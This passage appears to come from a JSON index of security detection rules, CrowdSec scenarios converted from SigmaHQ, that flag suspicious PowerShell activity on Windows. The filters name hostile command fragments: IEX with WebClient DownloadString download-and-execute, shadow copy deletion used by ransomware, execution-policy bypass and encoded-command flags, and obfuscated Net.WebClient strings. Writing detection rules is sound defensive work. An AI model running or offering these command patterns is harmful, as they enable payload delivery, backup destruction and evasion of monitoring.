endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe') && evt.Parsed.CommandLine contains 'Set-Acl ' && evt.Parsed.CommandLine contains '-AclObject ' && (evt.Parsed.CommandLine contains '-Path \"C:\\\\Windows' || evt.Parsed.CommandLine contains '-Path \\'C:\\\\Windows' || evt.Parsed.CommandLine contains '-Path %windir%' || evt.Parsed.CommandLine contains '-Path $env:windir') && (evt.Parsed.CommandLine contains 'FullControl' || evt.Parsed.CommandLine contains 'Allow'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"PowerShell Set-Acl On Windows Folder\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects PowerShell scripts to set the ACL to a file in the Windows folder\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_set_acl_susp_location.yml", "version": "0.2", "versions": {"0.1": {"digest": "d36341e59844a11ac742f14febcfa2c12a7498eff87b34c78219be59f8d00709"}, "0.2": {"digest": "29bc1959a4b85d4c534720f851d56a7d2250adeea89d27722f1a87f5e628a58f"}}}, "sigmahq/proc_creation_win_powershell_shadowcopy_deletion": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_shadowcopy_deletion\ndescription: |\n  Detects deletion of Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains 'Get-WmiObject' || evt.Parsed.CommandLine contains 'gwmi' || evt.Parsed.CommandLine contains 'Get-CimInstance' || evt.Parsed.CommandLine contains 'gcim') && evt.Parsed.CommandLine contains 'Win32_ShadowCopy' && (evt.Parsed.CommandLine contains '.Delete()' || evt.Parsed.CommandLine contains 'Remove-WmiObject' || evt.Parsed.CommandLine contains 'rwmi' || evt.Parsed.CommandLine contains 'Remove-CimInstance' || evt.Parsed.CommandLine contains 'rcim'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1490\n\n  label: \"Deletion of Volume Shadow Copies via WMI with PowerShell\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects deletion of Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_shadowcopy_deletion.yml", "version": "0.2", "versions": {"0.1": {"digest": "07e4496f46498bb20ba7f93e730174e63599b4d2a1f86d8a4f429ed8a391f2a6"}, "0.2": {"digest": "a2d5f301029c6dbafd77e220cad25d571f1765e5d664ae690ff89abcbff6c20d"}}}, "sigmahq/proc_creation_win_powershell_snapins_hafnium": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_snapins_hafnium\ndescription: |\n  Detects adding and using Exchange PowerShell snap-ins to export mailbox data. As seen used by HAFNIUM and APT27\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll']) && evt.Parsed.CommandLine contains 'Add-PSSnapin' && (evt.Parsed.CommandLine contains 'Microsoft.Exchange.Powershell.Snapin' || evt.Parsed.CommandLine contains 'Microsoft.Exchange.Management.PowerShell.SnapIn') && not (evt.Parsed.ParentImage == 'C:\\\\Windows\\\\System32\\\\msiexec.exe' && evt.Parsed.CommandLine contains '$exserver=Get-ExchangeServer ([Environment]::MachineName) -ErrorVariable exerr 2> $null'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n   - attack.t1114\n\n  label: \"Exchange PowerShell Snap-Ins Usage\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects adding and using Exchange PowerShell snap-ins to export mailbox data. As seen used by HAFNIUM and APT27\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_snapins_hafnium.yml", "version": "0.2", "versions": {"0.1": {"digest": "6994f16eb2b6df8d6023dd4a302faa442f52b2e44ce3f3b2b347c255e8962be4"}, "0.2": {"digest": "25f6e5cc67658cddb7c6bf4c7ece86fb8fc95604f07e72386904c002f483f0d5"}}}, "sigmahq/proc_creation_win_powershell_susp_download_patterns": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_susp_download_patterns\ndescription: |\n  Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'IEX ((New-Object Net.WebClient).DownloadString' || evt.Parsed.CommandLine contains 'IEX (New-Object Net.WebClient).DownloadString' || evt.Parsed.CommandLine contains 'IEX((New-Object Net.WebClient).DownloadString' || evt.Parsed.CommandLine contains 'IEX(New-Object Net.WebClient).DownloadString' || evt.Parsed.CommandLine contains ' -command (New-Object System.Net.WebClient).DownloadFile(' || evt.Parsed.CommandLine contains ' -c (New-Object System.Net.WebClient).DownloadFile(')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"Suspicious PowerShell Download and Execute Pattern\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_susp_download_patterns.yml", "version": "0.2", "versions": {"0.1": {"digest": "e55acc8d9950388e9d20c55fb1fcb2904824765bf0a23aef2b491e4dc7b18148"}, "0.2": {"digest": "7cb4ad4029f8412aa94ac16c7262e69fa9f7ec2b588d3bc1c96f3c07daf4f220"}}}, "sigmahq/proc_creation_win_powershell_susp_parameter_variation": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_susp_parameter_variation\ndescription: |\n  Detects suspicious PowerShell invocation with a parameter substring\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe') && (evt.Parsed.CommandLine contains ' -windowstyle h ' || evt.Parsed.CommandLine contains ' -windowstyl h' || evt.Parsed.CommandLine contains ' -windowsty h' || evt.Parsed.CommandLine contains ' -windowst h' || evt.Parsed.CommandLine contains ' -windows h' || evt.Parsed.CommandLine contains ' -windo h' || evt.Parsed.CommandLine contains ' -wind h' || evt.Parsed.CommandLine contains ' -win h' || evt.Parsed.CommandLine contains ' -wi h' || evt.Parsed.CommandLine contains ' -win h ' || evt.Parsed.CommandLine contains ' -win hi ' || evt.Parsed.CommandLine contains ' -win hid ' || evt.Parsed.CommandLine contains ' -win hidd ' || evt.Parsed.CommandLine contains ' -win hidde ' || evt.Parsed.CommandLine contains ' -NoPr ' || evt.Parsed.CommandLine contains ' -NoPro ' || evt.Parsed.CommandLine contains ' -NoProf ' || evt.Parsed.CommandLine contains ' -NoProfi ' || evt.Parsed.CommandLine contains ' -NoProfil ' || evt.Parsed.CommandLine contains ' -nonin ' || evt.Parsed.CommandLine contains ' -nonint ' || evt.Parsed.CommandLine contains ' -noninte ' || evt.Parsed.CommandLine contains ' -noninter ' || evt.Parsed.CommandLine contains ' -nonintera ' || evt.Parsed.CommandLine contains ' -noninterac ' || evt.Parsed.CommandLine contains ' -noninteract ' || evt.Parsed.CommandLine contains ' -noninteracti ' || evt.Parsed.CommandLine contains ' -noninteractiv ' || evt.Parsed.CommandLine contains ' -ec ' || evt.Parsed.CommandLine contains ' -encodedComman ' || evt.Parsed.CommandLine contains ' -encodedComma ' || evt.Parsed.CommandLine contains ' -encodedComm ' || evt.Parsed.CommandLine contains ' -encodedCom ' || evt.Parsed.CommandLine contains ' -encodedCo ' || evt.Parsed.CommandLine contains ' -encodedC ' || evt.Parsed.CommandLine contains ' -encoded ' || evt.Parsed.CommandLine contains ' -encode ' || evt.Parsed.CommandLine contains ' -encod ' || evt.Parsed.CommandLine contains ' -enco ' || evt.Parsed.CommandLine contains ' -en ' || evt.Parsed.CommandLine contains ' -executionpolic ' || evt.Parsed.CommandLine contains ' -executionpoli ' || evt.Parsed.CommandLine contains ' -executionpol ' || evt.Parsed.CommandLine contains ' -executionpo ' || evt.Parsed.CommandLine contains ' -executionp ' || evt.Parsed.CommandLine contains ' -execution bypass' || evt.Parsed.CommandLine contains ' -executio bypass' || evt.Parsed.CommandLine contains ' -executi bypass' || evt.Parsed.CommandLine contains ' -execut bypass' || evt.Parsed.CommandLine contains ' -execu bypass' || evt.Parsed.CommandLine contains ' -exec bypass' || evt.Parsed.CommandLine contains ' -exe bypass' || evt.Parsed.CommandLine contains ' -ex bypass' || evt.Parsed.CommandLine contains ' -ep bypass' || evt.Parsed.CommandLine contains ' /windowstyle h ' || evt.Parsed.CommandLine contains ' /windowstyl h' || evt.Parsed.CommandLine contains ' /windowsty h' || evt.Parsed.CommandLine contains ' /windowst h' || evt.Parsed.CommandLine contains ' /windows h' || evt.Parsed.CommandLine contains ' /windo h' || evt.Parsed.CommandLine contains ' /wind h' || evt.Parsed.CommandLine contains ' /win h' || evt.Parsed.CommandLine contains ' /wi h' || evt.Parsed.CommandLine contains ' /win h ' || evt.Parsed.CommandLine contains ' /win hi ' || evt.Parsed.CommandLine contains ' /win hid ' || evt.Parsed.CommandLine contains ' /win hidd ' || evt.Parsed.CommandLine contains ' /win hidde ' || evt.Parsed.CommandLine contains ' /NoPr ' || evt.Parsed.CommandLine contains ' /NoPro ' || evt.Parsed.CommandLine contains ' /NoProf ' || evt.Parsed.CommandLine contains ' /NoProfi ' || evt.Parsed.CommandLine contains ' /NoProfil ' || evt.Parsed.CommandLine contains ' /nonin ' || evt.Parsed.CommandLine contains ' /nonint ' || evt.Parsed.CommandLine contains ' /noninte ' || evt.Parsed.CommandLine contains ' /noninter ' || evt.Parsed.CommandLine contains ' /nonintera ' || evt.Parsed.CommandLine contains ' /noninterac ' || evt.Parsed.CommandLine contains ' /noninteract ' || evt.Parsed.CommandLine contains ' /noninteracti ' || evt.Parsed.CommandLine contains ' /noninteractiv ' || evt.Parsed.CommandLine contains ' /ec ' || evt.Parsed.CommandLine contains ' /encodedComman ' || evt.Parsed.CommandLine contains ' /encodedComma ' || evt.Parsed.CommandLine contains ' /encodedComm ' || evt.Parsed.CommandLine contains ' /encodedCom ' || evt.Parsed.CommandLine contains ' /encodedCo ' || evt.Parsed.CommandLine contains ' /encodedC ' || evt.Parsed.CommandLine contains ' /encoded ' || evt.Parsed.CommandLine contains ' /encode ' || evt.Parsed.CommandLine contains ' /encod ' || evt.Parsed.CommandLine contains ' /enco ' || evt.Parsed.CommandLine contains ' /en ' || evt.Parsed.CommandLine contains ' /executionpolic ' || evt.Parsed.CommandLine contains ' /executionpoli ' || evt.Parsed.CommandLine contains ' /executionpol ' || evt.Parsed.CommandLine contains ' /executionpo ' || evt.Parsed.CommandLine contains ' /executionp ' || evt.Parsed.CommandLine contains ' /execution bypass' || evt.Parsed.CommandLine contains ' /executio bypass' || evt.Parsed.CommandLine contains ' /executi bypass' || evt.Parsed.CommandLine contains ' /execut bypass' || evt.Parsed.CommandLine contains ' /execu bypass' || evt.Parsed.CommandLine contains ' /exec bypass' || evt.Parsed.CommandLine contains ' /exe bypass' || evt.Parsed.CommandLine contains ' /ex bypass' || evt.Parsed.CommandLine contains ' /ep bypass'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"Suspicious PowerShell Parameter Substring\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious PowerShell invocation with a parameter substring\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_susp_parameter_variation.yml", "version": "0.2", "versions": {"0.1": {"digest": "1d1c2186f334c3d06e93a987de3f297e19630fe2ae66131ae887fc78a9c799dc"}, "0.2": {"digest": "58fc495890694795dd8f53f78bf1b1a77cfdcdaf800972d0b0896b6ec7de65a5"}}}, "sigmahq/proc_creation_win_powershell_susp_parent_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_susp_parent_process\ndescription: |\n  Detects a suspicious or uncommon parent processes of PowerShell\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage contains 'tomcat' || evt.Parsed.ParentImage endsWith '\\\\amigo.exe' || evt.Parsed.ParentImage endsWith '\\\\browser.exe' || evt.Parsed.ParentImage endsWith '\\\\chrome.exe' || evt.Parsed.ParentImage endsWith '\\\\firefox.exe' || evt.Parsed.ParentImage endsWith '\\\\httpd.exe' || evt.Parsed.ParentImage endsWith '\\\\iexplore.exe' || evt.Parsed.ParentImage endsWith '\\\\jbosssvc.exe' || evt.Parsed.ParentImage endsWith '\\\\microsoftedge.exe' || evt.Parsed.ParentImage endsWith '\\\\microsoftedgecp.exe' || evt.Parsed.ParentImage endsWith '\\\\MicrosoftEdgeSH.exe' || evt.Parsed.ParentImage endsWith '\\\\mshta.exe' || evt.Parsed.ParentImage endsWith '\\\\nginx.exe' || evt.Parsed.ParentImage endsWith '\\\\outlook.exe' || evt.Parsed.ParentImage endsWith '\\\\php-cgi.exe' || evt.Parsed.ParentImage endsWith '\\\\regsvr32.exe' || evt.Parsed.ParentImage endsWith '\\\\rundll32.exe' || evt.Parsed.ParentImage endsWith '\\\\safari.exe' || evt.Parsed.ParentImage endsWith '\\\\services.exe' || evt.Parsed.ParentImage endsWith '\\\\sqlagent.exe' || evt.Parsed.ParentImage endsWith '\\\\sqlserver.exe' || evt.Parsed.ParentImage endsWith '\\\\sqlservr.exe' || evt.Parsed.ParentImage endsWith '\\\\vivaldi.exe' || evt.Parsed.ParentImage endsWith '\\\\w3wp.exe') && (evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.CommandLine contains '/c powershell' || evt.Parsed.CommandLine contains '/c pwsh' || evt.Parsed.Description == 'Windows PowerShell' || evt.Parsed.Product == 'PowerShell Core 6' || evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll']))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"Suspicious PowerShell Parent Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious or uncommon parent processes of PowerShell\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_susp_parent_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "efb66b81c357ef62ec19ae7631d318bc07533c3d61111dd5d624916606b245b4"}, "0.2": {"digest": "37404bd91c812a3624a718be64a470cb97984838ac8d696a6cce5d16ebb600de"}}}, "sigmahq/proc_creation_win_powershell_susp_ps_downloadfile": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_susp_ps_downloadfile\ndescription: |\n  Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'powershell' && evt.Parsed.CommandLine contains '.DownloadFile' && evt.Parsed.CommandLine contains 'System.Net.WebClient')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n   - attack.t1104\n   - attack.t1105\n\n  label: \"PowerShell DownloadFile\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_susp_ps_downloadfile.yml", "version": "0.2", "versions": {"0.1": {"digest": "08bf8208586b88196f2c1e3ab3a825b2eb21a0dbf121e5efce8fd7c61894b70f"}, "0.2": {"digest": "30dd15020d917ff9d353719d16cb91bafd2865013fbcefa15c05571f308e329a"}}}, "sigmahq/proc_creation_win_powershell_token_obfuscation": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_token_obfuscation\ndescription: |\n  Detects TOKEN OBFUSCATION technique from Invoke-Obfuscation\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine matches '\\\\w+`(\\\\w+|-|.)`[\\\\w+|\\\\s]' || evt.Parsed.CommandLine matches '\"(\\\\{\\\\d\\\\})+\"\\\\s*-f' || evt.Parsed.CommandLine matches '(?i)\\\\$\\\\{`?e`?n`?v`?:`?p`?a`?t`?h`?\\\\}') && not (evt.Parsed.CommandLine contains '${env:path}'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027.009\n\n  label: \"Powershell Token Obfuscation - Process Creation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects TOKEN OBFUSCATION technique from Invoke-Obfuscation\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_token_obfuscation.yml", "version": "0.2", "versions": {"0.1": {"digest": "43d07d40f27d6492f3100234fceecf16c9583eae2c9734dd89024e9e2ac0667c"}, "0.2": {"digest": "c5e8725a00130f2b73286a465c742facd0fa9b418989b9508230c6b7cc721dbb"}}}, "sigmahq/proc_creation_win_powershell_webclient_casing": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_webclient_casing\ndescription: |\n  Detects PowerShell command line contents that include a suspicious abnormal casing in the Net.Webclient (e.g. nEt.WEbCliEnT) string as used in obfuscation techniques\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll']) && (evt.Parsed.CommandLine contains 'TgBlAFQALgB3AEUAQg' || evt.Parsed.CommandLine contains '4AZQBUAC4AdwBFAEIA' || evt.Parsed.CommandLine contains 'OAGUAVAAuAHcARQBCA' || evt.Parsed.CommandLine contains 'bgBFAHQALgB3AGUAYg' || evt.Parsed.CommandLine contains '4ARQB0AC4AdwBlAGIA' || evt.Parsed.CommandLine contains 'uAEUAdAAuAHcAZQBiA' || evt.Parsed.CommandLine contains 'TgBFAHQALgB3AGUAYg' || evt.Parsed.CommandLine contains 'OAEUAdAAuAHcAZQBiA' || evt.Parsed.CommandLine contains 'bgBlAFQALgB3AGUAYg' || evt.Parsed.CommandLine contains '4AZQBUAC4AdwBlAGIA' || evt.Parsed.CommandLine contains 'uAGUAVAAuAHcAZQBiA' || evt.Parsed.CommandLine contains 'TgBlAFQALgB3AGUAYg' || evt.Parsed.CommandLine contains 'OAGUAVAAuAHcAZQBiA' || evt.Parsed.CommandLine contains 'bgBFAFQALgB3AGUAYg' || evt.Parsed.CommandLine contains '4ARQBUAC4AdwBlAGIA' || evt.Parsed.CommandLine contains 'uAEUAVAAuAHcAZQBiA' || evt.Parsed.CommandLine contains 'bgBlAHQALgBXAGUAYg' || evt.Parsed.CommandLine contains '4AZQB0AC4AVwBlAGIA' || evt.Parsed.CommandLine contains 'uAGUAdAAuAFcAZQBiA' || evt.Parsed.CommandLine contains 'bgBFAHQALgBXAGUAYg' || evt.Parsed.CommandLine contains '4ARQB0AC4AVwBlAGIA' || evt.Parsed.CommandLine contains 'uAEUAdAAuAFcAZQBiA' || evt.Parsed.CommandLine contains 'TgBFAHQALgBXAGUAYg' || evt.Parsed.CommandLine contains 'OAEUAdAAuAFcAZQBiA' || evt.Parsed.CommandLine contains 'bgBlAFQALgBXAGUAYg' || evt.Parsed.CommandLine contains '4AZQBUAC4AVwBlAGIA' || evt.Parsed.CommandLine contains 'uAGUAVAAuAFcAZQBiA' || evt.Parsed.CommandLine contains 'TgBlAFQALgBXAGUAYg' || evt.Parsed.CommandLine contains 'OAGUAVAAuAFcAZQBiA' || evt.Parsed.CommandLine contains 'bgBFAFQALgBXAGUAYg' || evt.Parsed.CommandLine contains '4ARQBUAC4AVwBlAGIA' || evt.Parsed.CommandLine contains 'uAEUAVAAuAFcAZQBiA' || evt.Parsed.CommandLine contains 'bgBlAHQALgB3AEUAYg' || evt.Parsed.CommandLine contains '4AZQB0AC4AdwBFAGIA' || evt.Parsed.CommandLine contains 'uAGUAdAAuAHcARQBiA' || evt.Parsed.CommandLine contains 'TgBlAHQALgB3AEUAYg' || evt.Parsed.CommandLine contains 'OAGUAdAAuAHcARQBiA' || evt.Parsed.CommandLine contains 'bgBFAHQALgB3AEUAYg' || evt.Parsed.CommandLine contains '4ARQB0AC4AdwBFAGIA' || evt.Parsed.CommandLine contains 'uAEUAdAAuAHcARQBiA' || evt.Parsed.CommandLine contains 'TgBFAHQALgB3AEUAYg' || evt.Parsed.CommandLine contains 'OAEUAdAAuAHcARQBiA' || evt.Parsed.CommandLine contains 'bgBlAFQALgB3AEUAYg' || evt.Parsed.CommandLine contains '4AZQBUAC4AdwBFAGIA' || evt.Parsed.CommandLine contains 'uAGUAVAAuAHcARQBiA' || evt.Parsed.CommandLine contains 'TgBlAFQALgB3AEUAYg' || evt.Parsed.CommandLine contains 'OAGUAVAAuAHcARQBiA' || evt.Parsed.CommandLine contains 'bgBFAFQALgB3AEUAYg' || evt.Parsed.CommandLine contains '4ARQBUAC4AdwBFAGIA' || evt.Parsed.CommandLine contains 'uAEUAVAAuAHcARQBiA' || evt.Parsed.CommandLine contains 'TgBFAFQALgB3AEUAYg' || evt.Parsed.CommandLine contains 'OAEUAVAAuAHcARQBiA' || evt.Parsed.CommandLine contains 'bgBlAHQALgBXAEUAYg' || evt.Parsed.CommandLine contains '4AZQB0AC4AVwBFAGIA' || evt.Parsed.CommandLine contains 'uAGUAdAAuAFcARQBiA' || evt.Parsed.CommandLine contains 'TgBlAHQALgBXAEUAYg' || evt.Parsed.CommandLine contains 'OAGUAdAAuAFcARQBiA' || evt.Parsed.CommandLine contains 'bgBFAHQALgBXAEUAYg' || evt.Parsed.CommandLine contains '4ARQB0AC4AVwBFAGIA' || evt.Parsed.CommandLine contains 'uAEUAdAAuAFcARQBiA' || evt.Parsed.CommandLine contains 'TgBFAHQALgBXAEUAYg' || evt.Parsed.CommandLine contains 'OAEUAdAAuAFcARQBiA' || evt.Parsed.CommandLine contains 'bgBlAFQALgBXAEUAYg' || evt.Parsed.CommandLine contains '4AZQBUAC4AVwBFAGIA' || evt.Parsed.CommandLine contains 'uAGUAVAAuAFcARQBiA' || evt.Parsed.CommandLine contains 'TgBlAFQALgBXAEUAYg' || evt.Parsed.CommandLine contains 'OAGUAVAAuAFcARQBiA' || evt.Parsed.CommandLine contains 'bgBFAFQALgBXAEUAYg' || evt.Parsed.CommandLine contains '4ARQBUAC4AVwBFAGIA' || evt.Parsed.CommandLine contains 'uAEUAVAAuAFcARQBiA' || evt.Parsed.CommandLine contains 'TgBFAFQALgBXAEUAYg' || evt.Parsed.CommandLine contains 'OAEUAVAAuAFcARQBiA' || evt.Parsed.CommandLine contains 'bgBlAHQALgB3AGUAQg' || evt.Parsed.CommandLine contains '4AZQB0AC4AdwBlAEIA' || evt.Parsed.CommandLine contains 'uAGUAdAAuAHcAZQBCA' || evt.Parsed.CommandLine contains 'TgBlAHQALgB3AGUAQg' || evt.Parsed.CommandLine contains 'OAGUAdAAuAHcAZQBCA' || evt.Parsed.CommandLine contains 'bgBFAHQALgB3AGUAQg' || evt.Parsed.CommandLine contains '4ARQB0AC4AdwBlAEIA' || evt.Parsed.CommandLine contains 'uAEUAdAAuAHcAZQBCA' || evt.Parsed.CommandLine contains 'TgBFAHQALgB3AGUAQg' || evt.Parsed.CommandLine contains 'OAEUAdAAuAHcAZQBCA' || evt.Parsed.CommandLine contains 'bgBlAFQALgB3AGUAQg' || evt.Parsed.CommandLine contains '4AZQBUAC4AdwBlAEIA' || evt.Parsed.CommandLine contains 'uAGUAVAAuAHcAZQBCA' || evt.Parsed.CommandLine contains 'TgBlAFQALgB3AGUAQg' || evt.Parsed.CommandLine contains 'OAGUAVAAuAHcAZQBCA' || evt.Parsed.CommandLine contains 'bgBFAFQALgB3AGUAQg' || evt.Parsed.CommandLine contains '4ARQBUAC4AdwBlAEIA' || evt.Parsed.CommandLine contains 'uAEUAVAAuAHcAZQBCA' || evt.Parsed.CommandLine contains 'TgBFAFQALgB3AGUAQg' || evt.Parsed.CommandLine contains 'OAEUAVAAuAHcAZQBCA' || evt.Parsed.CommandLine contains 'bgBlAHQALgBXAGUAQg' || evt.Parsed.CommandLine contains '4AZQB0AC4AVwBlAEIA' || evt.Parsed.CommandLine contains 'uAGUAdAAuAFcAZQBCA' || evt.Parsed.CommandLine contains 'TgBlAHQALgBXAGUAQg' || evt.Parsed.CommandLine contains 'OAGUAdAAuAFcAZQBCA' || evt.Parsed.CommandLine contains 'bgBFAHQALgBXAGUAQg' || evt.Parsed.CommandLine contains '4ARQB0AC4AVwBlAEIA' || evt.Parsed.CommandLine contains 'uAEUAdAAuAFcAZQBCA' || evt.Parsed.CommandLine contains 'TgBFAHQALgBXAGUAQg' || evt.Parsed.CommandLine contains 'OAEUAdAAuAFcAZQBCA' || evt.Parsed.CommandLine contains 'bgBlAFQALgBXAGUAQg' || evt.Parsed.CommandLine contains '4AZQBUAC4AVwBlAEIA' || evt.Parsed.CommandLine contains 'uAGUAVAAuAFcAZQBCA' || evt.Parsed.CommandLine contains 'TgBlAFQALgBXAGUAQg' || evt.Parsed.CommandLine contains 'OAGUAVAAuAFcAZQBCA' || evt.Parsed.CommandLine contains 'bgBFAFQALgBXAGUAQg' || evt.Parsed.CommandLine contains '4ARQBUAC4AVwBlAEIA' || evt.Parsed.CommandLine contains 'uAEUAVAAuAFcAZQBCA' || evt.Parsed.CommandLine contains 'TgBFAFQALgBXAGUAQg' || evt.Parsed.CommandLine contains 'OAEUAVAAuAFcAZQBCA' || evt.Parsed.CommandLine contains 'bgBlAHQALgB3AEUAQg' || evt.Parsed.CommandLine contains '4AZQB0AC4AdwBFAEIA' || evt.Parsed.CommandLine contains 'uAGUAdAAuAHcARQBCA' || evt.Parsed.CommandLine contains 'TgBlAHQALgB3AEUAQg' || evt.Parsed.CommandLine contains 'OAGUAdAAuAHcARQBCA' || evt.Parsed.CommandLine contains 'bgBFAHQALgB3AEUAQg' || evt.Parsed.CommandLine contains '4ARQB0AC4AdwBFAEIA' || evt.Parsed.CommandLine contains 'uAEUAdAAuAHcARQBCA' || evt.Parsed.CommandLine contains 'TgBFAHQALgB3AEUAQg' || evt.Parsed.CommandLine contains 'OAEUAdAAuAHcARQBCA' || evt.Parsed.CommandLine contains 'bgBlAFQALgB3AEUAQg' || evt.Parsed.CommandLine contains 'uAGUAVAAuAHcARQBCA' || evt.Parsed.CommandLine contains 'bgBFAFQALgB3AEUAQg' || evt.Parsed.CommandLine contains '4ARQBUAC4AdwBFAEIA' || evt.Parsed.CommandLine contains 'uAEUAVAAuAHcARQBCA' || evt.Parsed.CommandLine contains 'TgBFAFQALgB3AEUAQg' || evt.Parsed.CommandLine contains 'OAEUAVAAuAHcARQBCA' || evt.Parsed.CommandLine contains 'TgBlAHQALgBXAEUAQg' || evt.Parsed.CommandLine contains '4AZQB0AC4AVwBFAEIA' || evt.Parsed.CommandLine contains 'OAGUAdAAuAFcARQBCA' || evt.Parsed.CommandLine contains 'bgBFAHQALgBXAEUAQg' || evt.Parsed.CommandLine contains '4ARQB0AC4AVwBFAEIA' || evt.Parsed.CommandLine contains 'uAEUAdAAuAFcARQBCA' || evt.Parsed.CommandLine contains 'TgBFAHQALgBXAEUAQg' || evt.Parsed.CommandLine contains 'OAEUAdAAuAFcARQBCA' || evt.Parsed.CommandLine contains 'bgBlAFQALgBXAEUAQg' || evt.Parsed.CommandLine contains '4AZQBUAC4AVwBFAEIA' || evt.Parsed.CommandLine contains 'uAGUAVAAuAFcARQBCA' || evt.Parsed.CommandLine contains 'TgBlAFQALgBXAEUAQg' || evt.Parsed.CommandLine contains 'OAGUAVAAuAFcARQBCA' || evt.Parsed.CommandLine contains 'bgBFAFQALgBXAEUAQg' || evt.Parsed.CommandLine contains '4ARQBUAC4AVwBFAEIA' || evt.Parsed.CommandLine contains 'uAEUAVAAuAFcARQBCA'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"Net WebClient Casing Anomalies\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects PowerShell command line contents that include a suspicious abnormal casing in the Net.Webclient (e.g. nEt.WEbCliEnT) string as used in obfuscation techniques\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_webclient_casing.yml", "version": "0.2", "versions": {"0.1": {"digest": 